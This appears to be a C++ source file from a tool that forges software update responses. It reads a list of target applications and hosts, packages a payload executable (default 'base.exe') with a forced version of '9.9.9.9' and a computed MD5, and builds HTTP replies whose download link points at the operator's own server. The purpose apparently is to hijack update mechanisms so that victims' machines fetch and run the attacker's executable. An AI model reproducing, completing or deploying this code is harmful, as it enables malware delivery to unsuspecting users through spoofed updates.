
#include <windows.h>

#include "helper.h"

#include "json/json.h"
#include "FileOper.h"
#include "Utils/Tools.h"
#include "json/reader.h"
#include "SSL/sslPublic.h"
#include "cipher/CryptoUtils.h"
#include "HttpUtils.h"
#include <stdarg.h>
#include "cipher/compression.h"
#include "Public.h"

vector < UpdateData> gUpdateData;


int Helper::GetSdkVersion(char* szsdkver, char* szversions[8]) {
	int j = 0;
	szversions[j] = szsdkver;
	j++;
	int sdklen = lstrlenA(szsdkver);
	for (int i = 0; i < sdklen; i++)
	{
		if (szsdkver[i] == '.')
		{
			szsdkver[i] = 0;

			szversions[j] = szsdkver + i + 1;
			j++;
		}
	}

	return j;
}

string ResponseFromRegex(const char* regex, const  char* format,  int size,const char * payload) {

	int len = strlen(regex);

	string httptm = get_http_time();

	char* type = "";

	for (int i = 0; i < len; i++) {
		switch (regex[i]) {
			case 'J': {
				type = (char*)"application/json; charset=utf-8";
				continue;
			}
			case 'B': {
				type = (char*)"binary/octet-stream";
				continue;
			}
			case 'X': {
				type = (char*)"application/x-www-form-urlencoded";
				continue;
			}

			case ' ':
			{
				continue;
			}
			case '\t':
			{
				continue;
			}
			default: {
				log("%s %d regex:%s format:%s error\r\n", __FUNCTION__, __LINE__, regex, format);
				return "";
			}
		}
	}

	char* update = new char[0x10000];
	int updateLen = 0;
	updateLen = sprintf(update, format, httptm.c_str(),type, size, payload);

	string retstr = string(update, updateLen);
	delete []update;
	return retstr;
}


string ObjectFromRegex(const char* regex, const  char* format, const char * url, const char * ver, const char * sign,int size) {

	int cnt = 0;
	const char* params[256] = { 0 };

	int len = strlen(regex);
	for (int i = 0; i < len; i++) {
		switch (regex[i]) {
			case 'U': {
				params[cnt++] = url;
				continue;
			}

			case 'V': {
				params[cnt++] = ver;
				continue;
			}
			case 'M': {
				params[cnt++] = sign;
				continue;
			}
			case 'S': {
				params[cnt++] =(char*) size;
				continue;
			}
			case ' ':
			{
				continue;
			}
			case '\t':
			{
				continue;
			}
			default: {
				log("%s %d regex:%s format:%s error\r\n", __FUNCTION__, __LINE__, regex, format);
				return "";
			}
		}
	}

	int backsize = cnt * 4 + 8;
	char *outbuf = new char[0x10000];
	int outLen = 0;

	va_list args = (va_list) params;
	
	//params[0] = "hello";
	//va_start(args, params);
	
	//vsprintf(outbuf, "str:%s\r\n", args);
	outLen = vsprintf(outbuf, format, args);
	//va_end(args);
	/*
	__asm {
		
		lea edx,params
		mov eax,cnt
		shl eax,2
		add edx,eax
		sub edx,4
		mov ecx, cnt
		__push_params:
		push[edx]
		sub edx,4
		loop __push_params
		mov eax, format
		push eax
		mov eax, outbuf
		push eax
		call sprintf
		mov outLen,eax

		add esp,[ backsize]
	}
	*/
	string retstr = string(outbuf, outLen);
	delete []outbuf;
	return retstr;
}


string GetMainFileName(string fn) {
	int pos = fn.find(".");
	if (pos != -1) {
		return fn.substr(0, pos);
	}
	return fn;
}

int FileFormatTransfer(string format) {
	return 0;
}


int ObjectParser(vector<string> &targetHost) {
	int fs = 0;
	char* file = 0;
	int ret = 0;

	string curpath = gLocalPath + "config\\";

	ret = FileOper::fileReader(curpath+"objects.json", &file, &fs);
	if (ret == 0) {
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		exit(-1);
	}

	Json::Reader reader;

	Json::Value root;

	reader.parse((const char*)file, root,true);

	delete file;

	const Json::Value& obj = root["objects"];
	int size = obj.size();
	string pluginPath = Public::getPluginPath();

	for (int i = 0; i < size; i++) {
		bool valid = obj[i]["valid"].asBool();
		if (valid) {
			string app = obj[i]["app"].asString();
			string host = obj[i]["host"].asString();
			
			targetHost.push_back(host);
			string url = obj[i]["url"].asString();
			string payloadfn = obj[i]["payload"].asString();
			if (payloadfn == "") {
				payloadfn = "base.exe";
			}

			string inzipfn = obj[i]["inCompName"].asString();
			string comp = obj[i]["compress"].asString();
			if (comp == "7z")
			{
				string outfn = GetMainFileName(payloadfn) + ".zip";
				ret = Public::zipFile(inzipfn.c_str(), (char*)payloadfn.c_str(), (char*)outfn.c_str());
				payloadfn = outfn;
			}
			else if (comp == "zip") {
				string outfn = GetMainFileName(payloadfn) + ".7z";
				Compress7z((char*)outfn.c_str(), (char*)payloadfn.c_str(), (char*)inzipfn.c_str());
				payloadfn = outfn;
			}

			string version = obj[i]["version"].asString();
			if (version == "") {
				version = "9.9.9.9";
			}
			string md5 = obj[i]["md5"].asString();
			if (md5 == "") {
				char szmd5[64];
				unsigned char binmd5[16];
				CryptoUtils::getUpdateFileMd5(pluginPath + payloadfn, szmd5, binmd5, 1);
				md5 = string(szmd5, 32);
			}
			string formatfn = obj[i]["format"].asString();
			if (formatfn == "") {
				formatfn = app + ".txt";
			}

			int size = FileOper::getFileSize(pluginPath + payloadfn);
			string respFormatfn = obj[i]["httpFormat"].asString();
			if (respFormatfn == "") {
				respFormatfn = "http.txt";
			}

			string regex = obj[i]["regex"].asString();

			string respRegex = obj[i]["respRegex"].asString();
			char download[1024];
			wsprintfA(download, "http://%s/%s", gstrServerIP.c_str(), payloadfn.c_str());

			char* format = 0;
			int formatLen = 0;
			ret = FileOper::fileReader((curpath + formatfn).c_str(), &format, &formatLen);

			char* respFormat = 0;
			int respFormatLen = 0;
			ret = FileOper::fileReader((curpath + respFormatfn).c_str(), &respFormat, &respFormatLen);
			if (respFormatLen && formatLen) {
				string object = ObjectFromRegex(regex.c_str(), format, download, version.c_str(), md5.c_str(), size);

				string resp = ResponseFromRegex(respRegex.c_str(), respFormat, object.length(), object.c_str());

				delete format;
				delete respFormat;

				UpdateData data;
				data.host = host;
				data.response = resp;
				data.url = url;
				gUpdateData.push_back(data);
			}
		}
	}

	return 0;
}



	